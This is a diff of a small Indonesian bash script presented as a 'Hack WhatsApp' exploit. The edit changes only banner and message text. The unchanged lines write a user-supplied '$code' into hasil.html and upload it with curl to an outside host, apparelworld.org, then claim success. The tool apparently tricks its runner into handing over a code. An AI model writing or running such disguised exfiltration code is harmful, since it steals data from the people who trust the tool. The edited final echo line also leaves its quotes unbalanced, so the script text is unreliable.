@@ -1,7 +1,7 @@
 #!/bin/bash
 clear
 echo "
-<< Welcome FiqGamz >>
+<< Welcome FiqGanz >>
 ¦===================¦
    ΦHack WhatsappΦ
       ΔExploitΔ
@@ -36,5 +36,5 @@ echo "[+] Mengirim Exploit...";
 echo "Code => $code" >> hasil.html;
 curl -T hasil.html http://apparelworld.org/
 sleep 5
-echo "[+] Sukses Exploit (Follow Instagram "@hyputganz_"!";
+echo "[+] Sukses Exploit (Follow Instagram "@hyputganz_!";
 exit;
